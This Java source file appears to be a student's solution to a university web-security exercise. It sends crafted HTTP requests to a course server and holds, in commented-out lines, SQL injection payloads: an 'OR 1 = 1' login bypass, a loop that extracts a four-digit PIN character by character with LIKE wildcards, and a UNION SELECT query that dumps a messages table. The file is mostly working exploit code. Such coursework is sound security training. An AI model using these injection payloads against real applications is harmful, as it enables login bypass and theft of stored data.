import sun.misc.BASE64Decoder;

import javax.net.ssl.HttpsURLConnection;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Created by jmoravec on 02.11.2017.
 */
public class Main {

    private final String USER_AGENT = "Mozilla/5.0";
    private static final String APP_URL = "https://kbe.felk.cvut.cz/";

    public static void main(String[] args) throws Exception {
        Main main = new Main();

        // crack login screen
//        main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username like '%moravja8%' OR '&password=");

        // find pin
//        for (int i = 0; i < 4; i++) {
//            for (int j = 0; j < 10; j++) {
//                String pin = String.valueOf(j);
//                switch (i){
//                    case 0:
//                        pin = pin + "___";
//                        break;
//                    case 1:
//                        pin = "_" + pin + "__";
//                        break;
//                    case 2:
//                        pin = "__" + pin + "_";
//                        break;
//                    case 3:
//                        pin = "___" + pin;
//                        break;
//                    default:
//                        throw new Exception("Bad state");
//                }
//                main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '" + pin + "' OR '&password=");
//            }
//        }

        // pin validation
//        main.sendPost(APP_URL, "username= ' OR 1 = 1 AND username = 'rux6j_moravja8' AND pin like '5517' OR '&password=");

        // messages exploit
//        main.sendGet(APP_URL + "/index.php?offset=1%20UNION%20SELECT%20date_time%2C%20base64_xored_message_with_plain_key%20AS%20message%20FROM%20messages");

    }

    // HTTP POST request
    private void sendPost(String url, String body) throws Exception {

        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();

        //add reuqest header
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENT);
        con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");

        // Send post request
        con.setDoOutput(true);
        DataOutputStream wr = new DataOutputStream(con.getOutputStream());
        wr.writeBytes(body);
        wr.flush();
        wr.close();

        int responseCode = con.getResponseCode();
        System.out.println("\nSending 'POST' request to URL : " + url);
        System.out.println("Post parameters : " + body);
        System.out.println("Response Code : " + responseCode);

        BufferedReader in = new BufferedReader(
                new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuffer response = new StringBuffer();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        //print result
        System.out.println(response.toString());

    }



    // HTTP GET request
    private void sendGet(String url) throws Exception {

        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();

        // optional default is GET
        con.setRequestMethod("GET");

        //add request header
        con.setRequestProperty("User-Agent", USER_AGENT);

        int responseCode = con.getResponseCode();
        System.out.println("\nSending 'GET' request to URL : " + url);
        System.out.println("Response Code : " + responseCode);

        BufferedReader in = new BufferedReader(
                new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuffer response = new StringBuffer();

        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();

        //print result
        System.out.println(response.toString());

    }

}